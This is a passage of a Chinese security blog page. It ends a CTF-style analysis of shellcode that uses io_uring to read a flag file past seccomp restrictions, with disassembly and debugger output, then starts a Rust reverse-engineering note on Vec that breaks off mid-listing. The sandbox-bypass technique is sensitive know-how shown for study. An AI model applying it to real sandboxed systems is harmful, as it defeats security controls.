class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">io_uring_submit_func:</span><br><span class="line">sub rsp, 8</span><br><span class="line">mov r10, QWORD PTR [rdi+0x8]</span><br><span class="line">mov edx, DWORD PTR [rdi+0x40]</span><br><span class="line">mov r8d, DWORD PTR [rdi+0x44]</span><br><span class="line">mov eax, DWORD PTR [r10]</span><br><span class="line">sub r8d, edx</span><br><span class="line">mov rcx, QWORD PTR [rdi+0x10]</span><br><span class="line">mov r9,QWORD PTR [rdi+0x30]</span><br><span class="line">add r8d,eax</span><br><span class="line">mov ecx,DWORD PTR [rcx]</span><br><span class="line">nop DWORD PTR [rax+0x0]</span><br><span class="line">mov esi,eax</span><br><span class="line">and edx,ecx</span><br><span class="line">add eax,0x1</span><br><span class="line">and esi,ecx</span><br><span class="line">mov DWORD PTR [r9+rsi*4],edx</span><br><span class="line">mov edx,DWORD PTR [rdi+0x40]</span><br><span class="line">add edx,0x1</span><br><span class="line">mov DWORD PTR [rdi+0x40],edx</span><br><span class="line">mov DWORD PTR [r10],eax</span><br><span class="line">mov rdx,QWORD PTR [rdi]</span><br><span class="line">sub eax,DWORD PTR [rdx]</span><br><span class="line">xor edx,edx</span><br><span class="line">mov esi,eax</span><br><span class="line">mov eax,DWORD PTR [rdi+0xc0]</span><br><span class="line">mov ecx,eax</span><br><span class="line">and ecx,0x2</span><br><span class="line">mov r8d,ecx</span><br><span class="line">or r8d,0x1</span><br><span class="line">test al,0x1</span><br><span class="line">cmovne ecx,r8d</span><br><span class="line">mov edi,DWORD PTR [rdi+0xc4]</span><br><span class="line">mov r9,r8</span><br><span class="line">mov r8d,ecx</span><br><span class="line">mov ecx,edx</span><br><span class="line">mov edx,esi</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x1aa</span><br><span class="line">push r15</span><br><span class="line">push 0x8</span><br><span class="line">call syscall_func</span><br><span class="line">pop rdx</span><br><span class="line">pop rcx</span><br><span class="line">pop r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>io_uring_get_cqe</code>函数的处理方式与上面一个函数类似，也是将其扁平化。</p>
<p>下面我们主要分析一下最前面执行的这一大段shellcode的功能。需要注意的是，原exp中是将’/flag’字符串放在了这段shellcode后面，对应于这一页中偏移为0x3F9的地址。</p>
<p>第一次进行系统调用是<code>io_uring_setup</code>，需要2个参数，第1个参数设置提交队列和完成队列的队列项数，传入的参数是1，第2个参数是一个<code>io_uring_params</code>结构体实例，这里传入一个被0清空的栈空间。执行系统调用后，返回的文件描述符为3，这个结构体的内容发生改变：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fff373c83e8</span><br><span class="line">00:0000│ rsi rbp 0x7fff373c83e8 ◂— 0x200000001</span><br><span class="line">01:0008│         0x7fff373c83f0 ◂— 0x0</span><br><span class="line">02:0010│         0x7fff373c83f8 ◂— 0x1fff00000000</span><br><span class="line">03:0018│         0x7fff373c8400 ◂— 0x0</span><br><span class="line">04:0020│         0x7fff373c8408 ◂— 0x0</span><br><span class="line">05:0028│         0x7fff373c8410 ◂— 0x4000000000</span><br><span class="line">06:0030│         0x7fff373c8418 ◂— 0x10800000100</span><br><span class="line">07:0038│         0x7fff373c8420 ◂— 0x11000000114</span><br><span class="line">08:0040│  0x7fff373c8428 ◂— 0x180</span><br><span class="line">09:0048│  0x7fff373c8430 ◂— 0x0</span><br><span class="line">0a:0050│  0x7fff373c8438 ◂— 0xc000000080</span><br><span class="line">0b:0058│  0x7fff373c8440 ◂— 0x10c00000104</span><br><span class="line">0c:0060│  0x7fff373c8448 ◂— 0x1400000011c</span><br><span class="line">0d:0068│  0x7fff373c8450 ◂— 0x118</span><br><span class="line">0e:0070│  0x7fff373c8458 ◂— 0x0</span><br><span class="line">0f:0078│  0x7fff373c8460 ◂— 0x0</span><br><span class="line"></span><br><span class="line">struct io_uring_params &#123;</span><br><span class="line">	__u32 sq_entries;                   // 1</span><br><span class="line">	__u32 cq_entries;                   // 2</span><br><span class="line">	__u32 flags;                        // 0</span><br><span class="line">	__u32 sq_thread_cpu;                // 0</span><br><span class="line">	__u32 sq_thread_idle;               // 0</span><br><span class="line">	__u32 features;                     // 0x1FFF</span><br><span class="line">	__u32 wq_fd;                        // 0</span><br><span class="line">	__u32 resv[3];                      // 0, 0, 0</span><br><span class="line">	struct io_sqring_offsets &#123;</span><br><span class="line">        __u32 head;                     // 0</span><br><span class="line">        __u32 tail;                     // 0x40</span><br><span class="line">        __u32 ring_mask;                // 0x100</span><br><span class="line">        __u32 ring_entries;             // 0x108</span><br><span class="line">        __u32 flags;                    // 0x114</span><br><span class="line">        __u32 dropped;                  // 0x110</span><br><span class="line">        __u32 array;                    // 0x180</span><br><span class="line">        __u32 resv1;                    // 0</span><br><span class="line">        __u64 user_addr;                // 0</span><br><span class="line">    &#125;sq_off;</span><br><span class="line">	struct io_cqring_offsets &#123;</span><br><span class="line">        __u32 head;                     // 0x80</span><br><span class="line">        __u32 tail;                     // 0xC0</span><br><span class="line">        __u32 ring_mask;                // 0x104</span><br><span class="line">        __u32 ring_entries;             // 0x10C</span><br><span class="line">        __u32 overflow;                 // 0x11C</span><br><span class="line">        __u32 cqes;                     // 0x140</span><br><span class="line">        __u32 flags;                    // 0x118</span><br><span class="line">        __u32 resv1;                    // 0</span><br><span class="line">        __u64 user_addr;                // 0</span><br><span class="line">    &#125;cq_off;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里保存了SQE、CQE的一些项在内核页中的偏移，接下来我们只需要通过<code>mmap</code>，设置fd为3即可将这个内核页共享到用户空间。</p>
<p>下面的<code>mmap64</code>的参数分别为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned long addr = 0</span><br><span class="line">unsigned long len = 0x184</span><br><span class="line">unsigned long prot = 3 (PROT_READ | PROT_WRITE)</span><br><span class="line">unsigned long flags = 0x8001 (MAP_POPULATE | MAP_SHARED)</span><br><span class="line">unsigned long fd = 3</span><br><span class="line">unsigned long off = 0</span><br></pre></td></tr></table></figure>
<p><code>mmap</code>之后，将会返回一个0x1000的内存空间，这段内存空间即使在gdb中也无法进行读取。</p>
<p>后面紧跟着一个循环6次的loop1循环，其作用是将CQE和SQE的相关地址保存到栈中。然后又是一个mmap，参数为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned long addr = 0</span><br><span class="line">unsigned long len = 0x40</span><br><span class="line">unsigned long prot = 3 (PROT_READ | PROT_WRITE)</span><br><span class="line">unsigned long flags = 0x8001 (MAP_POPULATE | MAP_SHARED)</span><br><span class="line">unsigned long fd = 3</span><br><span class="line">unsigned long off = 0x10000000</span><br></pre></td></tr></table></figure>
<p>获取了一个offset为0x10000000，大小为一页的内存空间。通过查询源码得知，这是<code>io_uring_mmap</code>的一部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_SQ_RING		0ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_CQ_RING		0x8000000ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_SQES			0x10000000ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_PBUF_RING		0x80000000ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_PBUF_SHIFT		16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_MMAP_MASK		0xf8000000ULL</span></span><br></pre></td></tr></table></figure>
<p>可以看到内核这里预先定义了偏移，所以通过<code>mmap</code>设置偏移为<code>IORING_OFF_SQES</code>实际上也就是获取了SQE，即提交队列中的所有项的保存位置。然后，通过调用<code>io_uring_get_sqe</code>获取提交队列项，手动将<code>openat2</code>的opcode（0x1C）以及其他的参数保存到sqe中，在上面的shellcode里面是提交的openat2，实际上<code>openat</code>也是完全没问题的。随后使用<code>io_uring_submit</code>提交任务，使用<code>io_uring_get_cqe</code>获取完成队列中该任务完成的结果，返回一个文件描述符4。后面的读与写和打开类似，也是这样的流程。因此在最后一次调用<code>io_uring_get_cqe</code>时，能够直接输出。不过这个输出也是有概率的，多试几次必然能够输出内容。</p>
<p>以上就是使用<code>io_uring</code>异步输出系统绕过seccomp进行文件读写的分析。当然<code>io_uring</code>本身的功能是我们在开发过程中实际上更应该重视的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-5/" class="post-title-link" itemprop="url">Rust逆向学习 (5)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-10 20:24:50" itemprop="dateCreated datePublished" datetime="2023-11-10T20:24:50+08:00">2023-11-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-11-11 13:30:27" itemprop="dateModified" datetime="2023-11-11T13:30:27+08:00">2023-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文将对Rust中的通用集合类型——动态数组<code>Vec</code>进行学习，对应参考书中的第8章。</p>
<h1 id="reverse-for-vec"><a class="markdownIt-Anchor" href="#reverse-for-vec"></a> Reverse for Vec</h1>
<p><code>Vec</code>是Rust中的动态数据结构，与C++中的<code>vector</code>功能类似。实际上Rust中的<code>String</code>就是一个特殊的<code>Vec</code>，这可以通过查看Rust的内核代码证实。</p>
<h2 id="vec-与-添加元素"><a class="markdownIt-Anchor" href="#vec-与-添加元素"></a> vec! 与 添加元素</h2>
<p><code>vec!</code>是一个宏，用于快速初始化数组元素。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 168</span><br><span class="line">        mov     edi, 12</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        call    alloc::alloc::exchange_malloc</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        and     rax, 3</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        sete    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB31_1</span><br><span class="line">        jmp     .LBB31_2</span><br><span class="line">.LBB31_1:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 32]</span><br><span class="line">        mov     dword ptr [rsi], 1</span><br><span class="line">        mov     dword ptr [rsi + 4], 2</span><br><span class="line">        mov     dword ptr [rsi + 8], 3</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::slice::&lt;impl [T]&gt;::into_vec@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsp + 24], rdi</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        call    rax</span><br><span class="line">        mov     rdi, qword ptr [rsp + 24]</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::vec::Vec&lt;T,A&gt;::push@GOTPCREL]</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB31_5</span><br></pre></td></tr></table></figure>
<p>第一段中，我们可以发现<code>vec!</code>宏执行时，汇编实际上执行的是什么操作。首先调用了一个<code>exchange_malloc</code>函数，传入第一个参数为12，第二个参数为4，根据源码可以判断出，第一个参数应该是总的内存分配字节数量，第二个参数为每个元素的字节数量。这个函数的返回值是<code>Box&lt;[i32]&gt;</code>，这是Rust中的一个智能指针类型，能够在堆分配内存并管理生命周期，指针保存在栈中。后面对返回值进行了判断，如果内存分配失败则会输出错误信息。Box的特性如下，参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21484461/article/details/131731732?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169961961316800226578680%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169961961316800226578680&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-131731732-null-null.142%5Ev96%5Econtrol&amp;utm_term=Rust%20Box&amp;spm=1018.2226.3001.4187">传送门</a></p>
<blockquote>
<p>在栈上存储指针，指向堆上的数据。<br />
在转移所有权时负责释放堆上的内存。<br />
大小固定，适用于已知大小的类型。<br />
只能有一个所有者，不可共享引用。</p>
</blockquote>
<p>随后，代码中以<code>rsi</code>作为指针，初始化了3个数组元素。初始化完成后调用<code>into_vec</code>将<code>Box</code>转换为<code>Vec</code>类型。可以说，上面源码中的<code>vec!</code>宏基本等同于：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">b</span>: <span class="type">Box</span>&lt;[<span class="type">i32</span>]&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = b.<span class="title function_ invoke__">into_vec</span>();</span><br></pre></td></tr></table></figure>
<p>经过调试发现，调用<code>into_vec</code>后，<code>Vec</code>实例中的指针与<code>Box</code>的指针相同，但现在<code>Box</code>类型已经不复存在了，其所有权已经被转移到<code>Vec</code>中。</p>
<p>随后，程序调用了<code>push</code>方法扩充了<code>Vec</code>的空间，但原先的地址空间不足以容纳新的元素，因此需要将原先的内存空间释放掉再重新分配。考虑到Rust在汇编层调用的是libc，所以堆管理那套本质上还是<code>malloc</code>、<code>free</code>那些函数，与C/C++相同，方便进行分析。</p>
<p>在动态数组大小发生改变时，如果存在一个已有的对某个元素的引用，那么大小改变后该引用可能会指向被释放的空间，这是Rust所不能允许的，这就要回到所有权规则的定义。考虑存在不可变引用的情况，如果此时需要增加数组的长度，那么首先在增加前必然需要获取该动态数组的可变引用，而所有权规则不允许一个实例同时存在可变引用和不可变引用，因此导致编译失败。</p>
<h2 id="元素访问"><a class="markdownIt-Anchor" href="#元素访问"></a> 元素访问</h2>
<p>Rust中有两种方式访问动态数组中的元素，第一种是直接通过下标访问：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_5:</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_6]</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::ops::index::Index&lt;I&gt;&gt;::index@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 40]</span><br><span class="line">        mov     esi, 2</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        jmp     .LBB33_6</span><br></pre></td></tr></table></figure>
<p>这是加<code>&amp;</code>的汇编代码，第一个参数就是<code>Vec</code>实例地址，第二个参数是索引值，第三个参数疑似指向工程名的字符串切片，推测是在索引越界后输出错误信息用的。这里实际上是调用了<code>index</code>方法进行索引。这个<code>index</code>函数的返回值是一个地址，如果加了<code>&amp;</code>，则直接对指针进行操作，如果不加则会直接解引用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 不加&amp;</span><br><span class="line">.LBB32_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 16]</span><br><span class="line">        mov     eax, dword ptr [rax]</span><br><span class="line">        mov     dword ptr [rsp + 68], eax</span><br><span class="line">        lea     rax, [rsp + 68]</span><br><span class="line"></span><br><span class="line">; 加&amp;</span><br><span class="line">.LBB33_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 16]</span><br><span class="line">        mov     qword ptr [rsp + 64], rax</span><br><span class="line">        lea     rax, [rsp + 64]</span><br></pre></td></tr></table></figure>
<p>第二种元素访问的方法是使用<code>get</code>方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x.<span class="title function_ invoke__">get</span>(<span class="number">2</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.LBB35_5:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::ops::deref::Deref&gt;::deref@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 72]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 40], rdx</span><br><span class="line">        mov     qword ptr [rsp + 48], rax</span><br><span class="line">        jmp     .LBB35_6</span><br><span class="line">.LBB35_6:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 40]</span><br><span class="line">        mov     rdi, qword ptr [rsp + 48]</span><br><span class="line">        mov     rax, qword ptr [rip + core::slice::&lt;impl [T]&gt;::get@GOTPCREL]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        jmp     .LBB35_7</span><br><span class="line">.LBB35_7:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 32]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">        mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        jmp     .LBB35_8</span><br></pre></td></tr></table></figure>
<p>使用<code>get</code>函数前，会首先调用<code>deref</code>方法解引用获取动态数组类型中保存的定长数组实例，随后对这个实例使用<code>get</code>方法获取<code>Option&lt;T&gt;</code>实例。可见如果使用<code>get</code>方法进行数组的越界访问，那么<code>get</code>方法返回后不会立即<code>panic!</code>退出。</p>
<h2 id="元素遍历"><a class="markdownIt-Anchor" href="#元素遍历"></a> 元素遍历</h2>
<p>对于动态数组，要遍历数组中的元素，只需要使用for循环即可完成。但Rust源码看着简单，实际在汇编层完成的工作可不少。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> x &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.LBB46_5:</span><br><span class="line">        mov     byte ptr [rsp + 247], 0</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsp + 112], rax</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + 40]</span><br><span class="line">        movaps  xmmword ptr [rsp + 96], xmm0</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        lea     rsi, [rsp + 96]</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB46_6</span><br><span class="line">.LBB46_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp + 128], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsp + 136], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 144], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 88]</span><br><span class="line">        mov     qword ptr [rsp + 152], rax</span><br><span class="line">.LBB46_7:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::into_iter::IntoIter&lt;T,A&gt; as core::iter::traits::iterator::Iterator&gt;::next@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 128]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     dword ptr [rsp + 16], edx</span><br><span class="line">        mov     dword ptr [rsp + 20], eax</span><br><span class="line">        jmp     